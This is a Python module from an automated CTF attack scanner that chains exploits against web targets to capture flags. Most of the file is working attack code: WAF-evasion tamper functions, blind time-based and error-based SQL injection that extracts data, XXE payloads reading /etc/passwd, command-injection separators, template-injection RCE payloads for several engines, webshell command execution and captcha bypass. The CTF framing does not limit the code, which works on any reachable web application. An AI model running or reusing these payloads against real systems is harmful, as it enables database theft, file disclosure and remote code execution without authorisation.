"""
CTF Advanced Techniques — no LLM required.

Modules:
  1. Blind SQLi — time-based character extraction + error-based
  2. Blind XXE — error-based (no OOB server needed)
  3. WAF bypass — tamper functions for SQLi/CMDi payloads
  4. RCE auto-chain — after RCE found, auto-read flag files
  5. Source code grep — find hardcoded flags/secrets in leaked code
  6. Math captcha solver — parse and solve arithmetic captchas
"""
from __future__ import annotations

import asyncio
import re
import time
from typing import TYPE_CHECKING
from urllib.parse import urlparse, parse_qs

import httpx

from app.scanner.base import Finding, ScanResult
from app.scanner.flag_extractor import build_flag_pattern, extract_flags, search_flags_decoded

if TYPE_CHECKING:
    from app.scanner.context import ScanContext


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _get(url: str, timeout: int = 10, **kw) -> tuple[int, str, dict]:
    try:
        with httpx.Client(timeout=timeout, follow_redirects=True, verify=False,
                          headers={"User-Agent": "Mozilla/5.0"}) as c:
            r = c.get(url, **kw)
            return r.status_code, r.text, dict(r.headers)
    except Exception:
        return 0, "", {}


def _post(url: str, data=None, json_body=None, timeout: int = 10, **kw) -> tuple[int, str, dict]:
    try:
        with httpx.Client(timeout=timeout, follow_redirects=True, verify=False,
                          headers={"User-Agent": "Mozilla/5.0"}) as c:
            r = c.post(url, data=data, json=json_body, **kw)
            return r.status_code, r.text, dict(r.headers)
    except Exception:
        return 0, "", {}


def _flag_finding(flag: str, technique: str, url: str, detail: str = "") -> Finding:
    return Finding(
        type="flag",
        title=f"FLAG CAPTURED: {flag}",
        severity="critical",
        description=f"Flag found via {technique}.\nURL: {url}\nFlag: {flag}" + (f"\n{detail}" if detail else ""),
        evidence=f"flag={flag} url={url} technique={technique}",
        cvss_score=10.0,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    )


# ─────────────────────────────────────────────────────────────────────────────
# 1. WAF BYPASS TAMPER FUNCTIONS
# ─────────────────────────────────────────────────────────────────────────────

def _tamper_case(payload: str) -> str:
    """Randomise SQL keyword case."""
    for kw in ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT', 'UPDATE', 'DROP', 'SLEEP', 'IF']:
        mixed = ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(kw))
        payload = payload.replace(kw, mixed)
    return payload


def _tamper_comment(payload: str) -> str:
    """Insert inline comments between SQL keywords."""
    for kw in ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'SLEEP', 'IF']:
        payload = payload.replace(kw, kw[0] + '/**/' + kw[1:])
    return payload


def _tamper_encode(payload: str) -> str:
    """URL-encode spaces and special chars."""
    return payload.replace(' ', '%20').replace("'", '%27').replace('"', '%22')


def _tamper_space_to_plus(payload: str) -> str:
    return payload.replace(' ', '+')


def _tamper_space_to_comment(payload: str) -> str:
    return payload.replace(' ', '/**/')


def _tamper_hex_encode_strings(payload: str) -> str:
    """Encode string literals as hex (MySQL: 0x48544200)."""
    def to_hex(m: re.Match) -> str:
        s = m.group(1)
        return '0x' + s.encode().hex()
    return re.sub(r"'([^']*)'", to_hex, payload)


def _tamper_chunked(payload: str) -> str:
    """Add MySQL version comment around payload."""
    return f"/*!{payload}*/"


_TAMPERS = [
    _tamper_case,
    _tamper_comment,
    _tamper_space_to_comment,
    _tamper_hex_encode_strings,
    _tamper_chunked,
    lambda p: _tamper_case(_tamper_comment(p)),
    lambda p: _tamper_comment(_tamper_hex_encode_strings(p)),
]


def apply_tampers(payload: str) -> list[str]:
    """Return list of tampered variants of a payload."""
    variants = {payload}
    for fn in _TAMPERS:
        try:
            variants.add(fn(payload))
        except Exception:
            pass
    return list(variants)


# ─────────────────────────────────────────────────────────────────────────────
# 2. BLIND SQLi — TIME-BASED + ERROR-BASED EXTRACTION
# ─────────────────────────────────────────────────────────────────────────────

_SQLI_TIME_PROBES = [
    "' AND SLEEP(3)--",
    "' AND SLEEP(3)#",
    "1' AND SLEEP(3)--",
    "\" AND SLEEP(3)--",
    "' OR SLEEP(3)--",
    "1 AND SLEEP(3)--",
    "; WAITFOR DELAY '0:0:3'--",   # MSSQL
    "' AND pg_sleep(3)--",          # PostgreSQL
    "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",  # Oracle
]

# Error-based payloads that embed data in error messages
_SQLI_ERROR_PAYLOADS = [
    # MySQL — extractvalue
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT flag FROM flags LIMIT 1)))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT flag FROM flags LIMIT 1)),1)--",
    # MySQL — floor rand
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT flag FROM flags LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    # Generic table enum
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='flags')))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users')))--",
    # MSSQL
    "' AND 1=CONVERT(int,(SELECT TOP 1 flag FROM flags))--",
    # PostgreSQL
    "' AND CAST((SELECT flag FROM flags LIMIT 1) AS INTEGER)--",
]

# Common flag table/column names to probe
_FLAG_TABLES = ['flags', 'flag', 'ctf', 'secret', 'secrets', 'challenge', 'answers']
_FLAG_COLUMNS = ['flag', 'value', 'answer', 'secret', 'content', 'data']

# Time-based character extraction: extract flag char by char
_TIME_EXTRACT_TEMPLATE = (
    "' AND IF(ASCII(SUBSTR(({query}),{pos},1)){op}{val},SLEEP({delay}),0)--"
)


def _measure_response_time(url: str, timeout: int = 12) -> float:
    start = time.time()
    try:
        with httpx.Client(timeout=timeout, verify=False) as c:
            c.get(url)
    except Exception:
        pass
    return time.time() - start


def _test_time_based_sqli(url: str, param: str) -> bool:
    """Return True if parameter is vulnerable to time-based SQLi."""
    base_url = url.split('?')[0]
    # Baseline
    t0 = _measure_response_time(url)

    for payload in _SQLI_TIME_PROBES:
        test_url = base_url + f'?{param}={payload}'
        t = _measure_response_time(test_url, timeout=12)
        if t >= t0 + 2.5:  # 2.5s+ delay = vulnerable
            return True
    return False


def _extract_flag_time_based(url: str, param: str, query: str, max_len: int = 50, delay: int = 2) -> str:
    """Extract string char by char using time-based blind SQLi."""
    result = ''
    base_url = url.split('?')[0]

    for pos in range(1, max_len + 1):
        found_char = False
        # Binary search on ASCII value
        lo, hi = 32, 126
        while lo <= hi:
            mid = (lo + hi) // 2
            payload = _TIME_EXTRACT_TEMPLATE.format(
                query=query, pos=pos, op='>', val=mid, delay=delay
            )
            test_url = base_url + f'?{param}={payload}'
            t = _measure_response_time(test_url, timeout=delay + 6)
            if t >= delay - 0.3:
                lo = mid + 1
            else:
                hi = mid - 1

        if 32 < lo <= 126:
            result += chr(lo)
            found_char = True
        else:
            break  # End of string

        if not found_char:
            break

    return result


def _test_error_based_sqli(url: str, param: str, pattern) -> list[str]:
    """Try error-based SQLi payloads, extract flags from error messages."""
    flags_found = []
    base_url = url.split('?')[0]

    for payload in _SQLI_ERROR_PAYLOADS:
        for tampered in apply_tampers(payload)[:3]:
            test_url = base_url + f'?{param}={tampered}'
            _, body, _ = _get(test_url, timeout=10)
            if not body:
                continue
            # Look for flag in error message
            flags = search_flags_decoded(body, pattern)
            flags_found.extend(flags)
            # Also look for extracted data (after 0x7e = ~)
            tilde_re = re.search(r'~([^<"\'\s]{4,200})', body)
            if tilde_re:
                val = tilde_re.group(1)
                flags2 = extract_flags(val, pattern)
                flags_found.extend(flags2)
                if not flags2 and len(val) > 3:
                    # Could be column/table names — log for manual review
                    flags_found.append(f"ERROR_BASED_DATA: {val[:100]}")

    return list(dict.fromkeys(flags_found))


async def run_blind_sqli(
    ctx: 'ScanContext',
    target: str,
    pattern,
    all_findings: list[Finding],
) -> ScanResult:
    result = ScanResult()

    await ctx.log("Blind SQLi: scanning for time-based and error-based injection", module="blind_sqli")

    # Collect parametric URLs
    param_url_re = re.compile(r'https?://[^\s"\'<>]+\?[^\s"\'<>]+', re.I)
    urls: list[str] = []
    for f in all_findings:
        for m in param_url_re.finditer((f.evidence or '') + ' ' + (f.title or '')):
            urls.append(m.group(0))
    urls = list(dict.fromkeys(urls))[:15]

    for url in urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in list(params.keys())[:3]:
            await ctx.log(f"  Blind SQLi → {url[:80]} param={param}", module="blind_sqli")

            # Error-based (fast)
            error_flags = _test_error_based_sqli(url, param, pattern)
            for flag in error_flags:
                if flag.startswith('ERROR_BASED_DATA:'):
                    await ctx.log(f"  Error-based data: {flag}", level="warning", module="blind_sqli")
                    result.findings.append(Finding(
                        type="sqli_data",
                        title=f"Error-based SQLi data leak: {url[:60]}",
                        severity="high",
                        description=f"Error-based SQLi revealed: {flag}\nURL: {url}",
                        evidence=f"url={url} data={flag}",
                        cvss_score=8.8,
                    ))
                else:
                    result.findings.append(_flag_finding(flag, "Error-based SQLi", url))

            # Time-based detection
            if not error_flags:
                vulnerable = _test_time_based_sqli(url, param)
                if vulnerable:
                    await ctx.log(f"  TIME-BASED SQLi confirmed on {url[:60]} param={param}", level="warning", module="blind_sqli")
                    # Try extracting flag from common tables
                    for table in _FLAG_TABLES:
                        for col in _FLAG_COLUMNS:
                            query = f"SELECT {col} FROM {table} LIMIT 1"
                            await ctx.log(f"  Extracting: {query}", module="blind_sqli")
                            extracted = _extract_flag_time_based(url, param, query)
                            if extracted and len(extracted) > 3:
                                flags = extract_flags(extracted, pattern)
                                if flags:
                                    for flag in flags:
                                        result.findings.append(_flag_finding(
                                            flag, f"Blind SQLi time-based ({table}.{col})", url
                                        ))
                                else:
                                    result.findings.append(Finding(
                                        type="sqli_data",
                                        title=f"Blind SQLi extracted: {table}.{col}={extracted[:50]}",
                                        severity="critical",
                                        description=f"Time-based extraction from {table}.{col}:\n{extracted}\nURL: {url}",
                                        evidence=f"url={url} table={table} col={col} value={extracted}",
                                        cvss_score=9.8,
                                    ))

    await ctx.log(
        f"Blind SQLi complete: {sum(1 for f in result.findings if f.type == 'flag')} flag(s)",
        module="blind_sqli",
    )
    return result


# ─────────────────────────────────────────────────────────────────────────────
# 3. BLIND XXE — ERROR-BASED (no OOB server needed)
# ─────────────────────────────────────────────────────────────────────────────

_FLAG_PATHS = [
    '/flag.txt', '/flag', '/etc/flag', '/var/flag',
    '/home/flag.txt', '/app/flag.txt', '/root/flag.txt',
    '/var/www/html/flag.txt', '/srv/flag.txt', '/etc/passwd',
]

def _build_xxe_error_payload(path: str) -> str:
    """
    Error-based XXE: trigger parser error containing file content.
    Works when XML parser error messages include entity value.
    """
    return f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file://{path}">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<foo>test</foo>"""


def _build_xxe_direct_payload(path: str) -> str:
    return f"""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{path}">]><foo>&xxe;</foo>"""


def _build_xxe_php_filter(path: str) -> str:
    """PHP filter wrapper — reads file as base64 via XXE."""
    return f"""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={path}">]><foo>&xxe;</foo>"""


async def run_blind_xxe(
    ctx: 'ScanContext',
    target: str,
    pattern,
    all_findings: list[Finding],
) -> ScanResult:
    result = ScanResult()

    await ctx.log("Blind XXE: error-based + direct + PHP filter attacks", module="blind_xxe")

    # Collect XML endpoints
    xml_endpoints: list[str] = []
    for f in all_findings:
        text = (f.evidence or '') + ' ' + (f.description or '')
        if any(kw in text.lower() for kw in ['xml', 'soap', 'wsdl', '.xml', 'application/xml']):
            for m in re.finditer(r'https?://[^\s"\'<>]+', text):
                xml_endpoints.append(m.group(0).split('?')[0])

    # Probe common XML endpoints
    base = target if target.startswith('http') else f'http://{target}'
    for ep in ['/api', '/api/v1', '/upload', '/parse', '/xml', '/soap', '/service',
               '/api/data', '/data', '/import', '/api/import', '/webhook']:
        xml_endpoints.append(base + ep)

    xml_endpoints = list(dict.fromkeys(xml_endpoints))[:12]

    for endpoint in xml_endpoints:
        for path in _FLAG_PATHS:
            # Method 1: error-based
            payload = _build_xxe_error_payload(path)
            _, body, _ = _post(endpoint, data=payload.encode(), timeout=8,
                               headers={'Content-Type': 'application/xml'})
            flags = search_flags_decoded(body, pattern)
            for flag in flags:
                result.findings.append(_flag_finding(flag, f"XXE error-based ({path})", endpoint))
            if 'root:' in body and ':/bin/' in body:
                result.findings.append(Finding(
                    type="xxe",
                    title=f"XXE: /etc/passwd via error-based ({endpoint})",
                    severity="critical",
                    description=f"XXE error-based confirmed. /etc/passwd readable.\n{body[:400]}",
                    evidence=f"url={endpoint} path={path}",
                    cvss_score=9.1,
                ))

            # Method 2: direct entity
            payload2 = _build_xxe_direct_payload(path)
            _, body2, _ = _post(endpoint, data=payload2.encode(), timeout=8,
                                headers={'Content-Type': 'application/xml'})
            flags2 = search_flags_decoded(body2, pattern)
            for flag in flags2:
                result.findings.append(_flag_finding(flag, f"XXE direct ({path})", endpoint))

            # Method 3: PHP filter (base64)
            payload3 = _build_xxe_php_filter(path)
            _, body3, _ = _post(endpoint, data=payload3.encode(), timeout=8,
                                headers={'Content-Type': 'application/xml'})
            if body3 and len(body3.strip()) > 20:
                flags3 = search_flags_decoded(body3, pattern)
                for flag in flags3:
                    result.findings.append(_flag_finding(flag, f"XXE PHP filter ({path})", endpoint))

    await ctx.log(
        f"Blind XXE complete: {sum(1 for f in result.findings if f.type == 'flag')} flag(s)",
        module="blind_xxe",
    )
    return result


# ─────────────────────────────────────────────────────────────────────────────
# 4. RCE AUTO-CHAIN
# ─────────────────────────────────────────────────────────────────────────────

_FLAG_READ_CMDS = [
    'cat /flag.txt',
    'cat /flag',
    'cat /etc/flag',
    'cat /var/flag',
    'cat /root/flag.txt',
    'cat /home/*/flag.txt',
    'cat /app/flag.txt',
    'find / -name flag.txt -maxdepth 6 2>/dev/null | head -5 | xargs cat',
    'find / -name flag -maxdepth 6 2>/dev/null | head -5 | xargs cat',
    'ls /;cat /flag.txt',
    'cat /var/www/html/flag.txt',
    'cat /srv/flag.txt',
    'env | grep -i flag',
    'printenv | grep -i flag',
]

_CMDI_INJECT_PARAMS = [
    '; {cmd}',
    '| {cmd}',
    '`{cmd}`',
    '$({cmd})',
    '&& {cmd}',
    '%0a{cmd}',
    '\n{cmd}',
    '%(cmd)s',
]


def _try_rce_on_url(url: str, param: str, pattern) -> list[str]:
    """Given a URL+param known/suspected vulnerable to CMDi, try to read flag."""
    flags_found = []
    base_url = url.split('?')[0]

    for cmd in _FLAG_READ_CMDS:
        for inject_tmpl in _CMDI_INJECT_PARAMS:
            payload = inject_tmpl.replace('{cmd}', cmd)
            test_url = base_url + f'?{param}={payload}'
            _, body, _ = _get(test_url, timeout=10)
            flags = search_flags_decoded(body, pattern)
            flags_found.extend(flags)
            if flags:
                break
        if flags_found:
            break

    return list(dict.fromkeys(flags_found))


def _try_rce_on_upload(shell_url: str, pattern) -> list[str]:
    """Execute commands via uploaded webshell."""
    flags_found = []
    for cmd in _FLAG_READ_CMDS:
        # cmd param style
        for param in ['cmd', 'c', 'exec', 'command', 'run', 'system', 'e']:
            _, body, _ = _get(f"{shell_url}?{param}={cmd}", timeout=8)
            flags = search_flags_decoded(body, pattern)
            flags_found.extend(flags)
            if flags:
                return flags_found
    return flags_found


def _try_ssti_rce(url: str, param: str, engine: str, pattern) -> list[str]:
    """Given confirmed SSTI engine, execute flag-reading command."""
    flags_found = []
    rce_payloads: dict[str, list[str]] = {
        'jinja2': [
            "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('find / -name flag.txt 2>/dev/null | head -3 | xargs cat').read()}}",
            "{{'%s'.__class__.__mro__[1].__subclasses__()[%d].__init__.__globals__['os'].popen('cat /flag.txt').read()}}" % ('%s', 273),
        ],
        'twig': [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /flag.txt')}}",
            "{{['cat /flag.txt']|map('system')|join}}",
        ],
        'freemarker': [
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag.txt")}',
        ],
        'velocity': [
            '#set($e="e")#set($a=$e.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"cat /flag.txt"))cat /flag.txt',
        ],
        'erb': [
            '<%= `cat /flag.txt` %>',
            '<%= IO.read("/flag.txt") %>',
        ],
    }
    base_url = url.split('?')[0]
    payloads = rce_payloads.get(engine.lower(), [])
    for p in payloads:
        test_url = base_url + f'?{param}={p}'
        _, body, _ = _get(test_url, timeout=10)
        flags = search_flags_decoded(body, pattern)
        flags_found.extend(flags)
        if flags:
            break
    return list(dict.fromkeys(flags_found))


async def run_rce_autochain(
    ctx: 'ScanContext',
    pattern,
    all_findings: list[Finding],
) -> ScanResult:
    result = ScanResult()

    await ctx.log("RCE auto-chain: escalating confirmed vulnerabilities to flag read", module="rce_chain")

    for f in all_findings:
        # CMDi findings
        if f.type in ('cmdi', 'command_injection', 'rce'):
            url_m = re.search(r'url=([^\s]+)', f.evidence or '')
            param_m = re.search(r'param(?:eter)?=(\w+)', f.evidence or '')
            if url_m and param_m:
                url, param = url_m.group(1), param_m.group(1)
                await ctx.log(f"  RCE chain: CMDi on {url[:60]} param={param}", module="rce_chain")
                flags = _try_rce_on_url(url, param, pattern)
                for flag in flags:
                    result.findings.append(_flag_finding(flag, "RCE chain via CMDi", url))

        # SSTI findings
        if f.type == 'ssti':
            url_m = re.search(r'url=([^\s]+)', f.evidence or '')
            param_m = re.search(r'param(?:eter)?=(\w+)', f.evidence or '')
            engine_m = re.search(r'(?:via|engine)[ :]+(\w+)', f.title or '')
            if url_m:
                url = url_m.group(1)
                param = param_m.group(1) if param_m else 'q'
                engine = engine_m.group(1).lower() if engine_m else 'jinja2'
                await ctx.log(f"  RCE chain: SSTI/{engine} on {url[:60]}", module="rce_chain")
                flags = _try_ssti_rce(url, param, engine, pattern)
                for flag in flags:
                    result.findings.append(_flag_finding(flag, f"RCE chain via SSTI/{engine}", url))

        # File upload shell
        if f.type in ('file_upload', 'webshell'):
            shell_url_m = re.search(r'shell_url=([^\s]+)', f.evidence or '')
            if shell_url_m:
                shell_url = shell_url_m.group(1)
                await ctx.log(f"  RCE chain: webshell at {shell_url[:60]}", module="rce_chain")
                flags = _try_rce_on_upload(shell_url, pattern)
                for flag in flags:
                    result.findings.append(_flag_finding(flag, "RCE chain via webshell", shell_url))

        # LFI → log poisoning attempt
        if f.type == 'lfi':
            url_m = re.search(r'url=([^\s]+)', f.evidence or '')
            if url_m:
                lfi_url = url_m.group(1)
                # Try common CTF flag paths directly via LFI
                for path in ['/flag.txt', '/flag', '/etc/flag']:
                    if 'FUZZ' in lfi_url:
                        test = lfi_url.replace('FUZZ', path)
                    else:
                        test = lfi_url
                    _, body, _ = _get(test, timeout=8)
                    flags = search_flags_decoded(body, pattern)
                    for flag in flags:
                        result.findings.append(_flag_finding(flag, f"RCE chain via LFI ({path})", test))

    await ctx.log(
        f"RCE auto-chain complete: {sum(1 for f in result.findings if f.type == 'flag')} flag(s)",
        module="rce_chain",
    )
    return result


# ─────────────────────────────────────────────────────────────────────────────
# 5. SOURCE CODE GREP
# ─────────────────────────────────────────────────────────────────────────────

_SECRET_RE = re.compile(
    r'(?:flag|FLAG|secret|SECRET|password|PASSWORD|answer|ANSWER|key|KEY)\s*(?:=|:)\s*["\']([^"\']{4,200})["\']',
    re.IGNORECASE,
)
_HARDCODED_CHECK_RE = re.compile(
    r'if\s+(?:input|answer|flag|guess|user_input)\s*(?:==|===|\.equals\()\s*["\']([^"\']{3,200})["\']',
    re.IGNORECASE,
)
_ENV_VAR_RE = re.compile(
    r'(?:FLAG|SECRET|KEY|PASSWORD)\s*=\s*["\']?([A-Za-z0-9_!@#$%^&*()\-+={}]{4,200})["\']?',
)


def grep_source(code: str, pattern) -> list[tuple[str, str]]:
    """
    Grep source code for hardcoded secrets/flags.
    Returns list of (description, value).
    """
    findings: list[tuple[str, str]] = []

    # Direct flag patterns
    for m in pattern.finditer(code):
        findings.append(('direct flag in source', m.group(0)))

    # Variable assignments
    for m in _SECRET_RE.finditer(code):
        val = m.group(1)
        findings.append((f'hardcoded secret: {m.group(0)[:60]}', val))

    # Conditional checks (if input == "FLAG{...}")
    for m in _HARDCODED_CHECK_RE.finditer(code):
        val = m.group(1)
        findings.append((f'hardcoded check: {m.group(0)[:60]}', val))

    # Environment variables
    for m in _ENV_VAR_RE.finditer(code):
        val = m.group(1)
        if len(val) > 3:
            findings.append((f'env var in source', val))

    return findings


async def run_source_grep(
    ctx: 'ScanContext',
    pattern,
    all_findings: list[Finding],
) -> ScanResult:
    result = ScanResult()

    await ctx.log("Source grep: searching leaked source code for hardcoded flags", module="source_grep")

    # Collect source code from findings (git leaks, backup files, JS analysis)
    source_texts: list[tuple[str, str]] = []
    for f in all_findings:
        if f.type in ('source_leak', 'secret_leak') and f.description:
            source_texts.append((f.title or 'unknown', f.description))
        if f.raw_output and len(f.raw_output) > 20:
            source_texts.append((f'raw_output:{f.type}', f.raw_output))
        # JS analysis evidence
        if f.type in ('endpoint', 'web') and f.evidence and len(f.evidence) > 100:
            source_texts.append((f'evidence:{f.type}', f.evidence))

    flags_found = 0
    for source_name, code in source_texts:
        hits = grep_source(code, pattern)
        for desc, val in hits:
            flags = extract_flags(val, pattern)
            if flags:
                for flag in flags:
                    flags_found += 1
                    await ctx.log(f"  ★ SOURCE FLAG: {flag} ({desc})", level="success", module="source_grep")
                    result.findings.append(_flag_finding(flag, f"Source code grep ({source_name[:40]})", '', desc))
            elif len(val) > 3:
                result.findings.append(Finding(
                    type="secret_leak",
                    title=f"Hardcoded secret in source: {val[:50]}",
                    severity="high",
                    description=f"Found in {source_name}:\n{desc}\nValue: {val}",
                    evidence=f"source={source_name[:40]} value={val[:100]}",
                    cvss_score=7.5,
                ))

    await ctx.log(
        f"Source grep complete: {flags_found} flag(s), {len(result.findings)} total",
        module="source_grep",
    )
    return result


# ─────────────────────────────────────────────────────────────────────────────
# 6. MATH CAPTCHA SOLVER
# ─────────────────────────────────────────────────────────────────────────────

_MATH_RE = re.compile(
    r'(?:what\s+is\s+)?(\d+)\s*([+\-\*×÷/])\s*(\d+)\s*[=?]?',
    re.IGNORECASE,
)
_WORD_NUMBER = {
    'zero': 0, 'one': 1, 'two': 2, 'three': 3, 'four': 4,
    'five': 5, 'six': 6, 'seven': 7, 'eight': 8, 'nine': 9,
    'ten': 10, 'eleven': 11, 'twelve': 12,
}


def solve_math_captcha(text: str) -> str | None:
    """
    Parse and evaluate a math captcha from HTML/text.
    Returns the answer as string, or None if not found.
    """
    # Replace word numbers
    for word, n in _WORD_NUMBER.items():
        text = re.sub(r'\b' + word + r'\b', str(n), text, flags=re.I)

    m = _MATH_RE.search(text)
    if not m:
        return None

    a, op, b = int(m.group(1)), m.group(2), int(m.group(3))
    try:
        if op in ('+',):
            return str(a + b)
        elif op in ('-',):
            return str(a - b)
        elif op in ('*', '×'):
            return str(a * b)
        elif op in ('/', '÷'):
            return str(a // b) if b != 0 else None
    except Exception:
        pass
    return None


def _find_captcha_input(html: str) -> str | None:
    """Find the name of the captcha input field."""
    for pat in [
        r'<input[^>]+name=["\'](\w*captcha\w*)["\']',
        r'<input[^>]+name=["\'](\w*answer\w*)["\']',
        r'<input[^>]+name=["\'](\w*result\w*)["\']',
        r'<input[^>]+name=["\'](\w*calc\w*)["\']',
        r'<input[^>]+name=["\'](\w*math\w*)["\']',
        r'<input[^>]+id=["\'](\w*captcha\w*)["\'][^>]+name=["\']([^"\']+)["\']',
    ]:
        m = re.search(pat, html, re.I)
        if m:
            return m.group(1)
    # Fallback: any text input near captcha text
    if re.search(r'captcha|prove you|robot|human|calculate', html, re.I):
        m = re.search(r'<input[^>]+type=["\']text["\'][^>]+name=["\']([^"\']+)["\']', html, re.I)
        if m:
            return m.group(1)
    return None


async def solve_captcha_on_page(
    url: str,
    form_data: dict,
    pattern,
) -> tuple[int, str]:
    """
    Detect math captcha on page, solve it, submit form with answer.
    Returns (status, response_body).
    """
    _, html, _ = _get(url, timeout=8)
    if not html:
        return 0, ''

    answer = solve_math_captcha(html)
    if not answer:
        return 0, ''

    captcha_field = _find_captcha_input(html)
    if not captcha_field:
        return 0, ''

    form_data[captcha_field] = answer
    status, body, _ = _post(url, data=form_data, timeout=10)
    return status, body


async def run_math_captcha(
    ctx: 'ScanContext',
    target: str,
    pattern,
    all_findings: list[Finding],
) -> ScanResult:
    result = ScanResult()

    await ctx.log("Math captcha solver: detecting and solving arithmetic captchas", module="captcha")

    base = target if target.startswith('http') else f'http://{target}'
    form_endpoints = ['/login', '/submit', '/flag', '/answer', '/solve', '/check',
                      '/api/flag', '/api/submit', '/api/answer', '/', '/index.php']

    # Also collect from findings
    for f in all_findings:
        for m in re.finditer(r'https?://[^\s"\'<>]+', (f.evidence or '')):
            form_endpoints.append(m.group(0).split('?')[0])

    form_endpoints = list(dict.fromkeys(form_endpoints))[:15]

    for ep in form_endpoints:
        url = ep if ep.startswith('http') else base + ep
        _, html, _ = _get(url, timeout=8)
        if not html:
            continue

        answer = solve_math_captcha(html)
        if not answer:
            continue

        captcha_field = _find_captcha_input(html)
        if not captcha_field:
            continue

        await ctx.log(f"  Math captcha detected at {url[:60]}: answer={answer}", module="captcha")

        # Try submitting with the solved captcha
        for attempt_data in [
            {captcha_field: answer},
            {captcha_field: answer, 'submit': '1'},
            {captcha_field: answer, 'flag': '', 'submit': 'Submit'},
        ]:
            status, body = await solve_captcha_on_page(url, attempt_data, pattern)
            if status in (200, 201) and body:
                flags = search_flags_decoded(body, pattern)
                for flag in flags:
                    await ctx.log(f"  ★ FLAG via math captcha: {flag}", level="success", module="captcha")
                    result.findings.append(_flag_finding(flag, "Math captcha solve", url, f"captcha_answer={answer}"))

    await ctx.log(
        f"Math captcha complete: {sum(1 for f in result.findings if f.type == 'flag')} flag(s)",
        module="captcha",
    )
    return result


# ─────────────────────────────────────────────────────────────────────────────
# Combined entry point
# ─────────────────────────────────────────────────────────────────────────────

async def run_ctf_advanced(
    ctx: 'ScanContext',
    target: str,
    ctf_flag_format: str | None,
    all_findings: list[Finding],
) -> ScanResult:
    """Run all advanced CTF techniques."""
    pattern = build_flag_pattern(ctf_flag_format)
    combined = ScanResult()

    steps = [
        ("ctf_blind_sqli", "Blind SQLi (time+error based)",
         lambda: run_blind_sqli(ctx, target, pattern, all_findings)),
        ("ctf_blind_xxe",  "Blind XXE (error based)",
         lambda: run_blind_xxe(ctx, target, pattern, all_findings)),
        ("ctf_rce_chain",  "RCE auto-chain → flag read",
         lambda: run_rce_autochain(ctx, pattern, all_findings)),
        ("ctf_source_grep","Source code grep",
         lambda: run_source_grep(ctx, pattern, all_findings)),
        ("ctf_captcha",    "Math captcha solver",
         lambda: run_math_captcha(ctx, target, pattern, all_findings)),
    ]

    for phase_key, label, coro_fn in steps:
        await ctx.set_phase(phase_key)
        await ctx.log(f"Advanced CTF → {label}", module="ctf_advanced")
        try:
            sub = await coro_fn()
            combined.findings.extend(sub.findings)
            combined.errors.extend(sub.errors)
            flags = [f for f in sub.findings if f.type == 'flag']
            if flags:
                await ctx.log(f"  ★ {len(flags)} flag(s) via {label}", level="success", module="ctf_advanced")
        except Exception as exc:
            await ctx.log(f"  {label} error: {exc}", level="warning", module="ctf_advanced")

    return combined
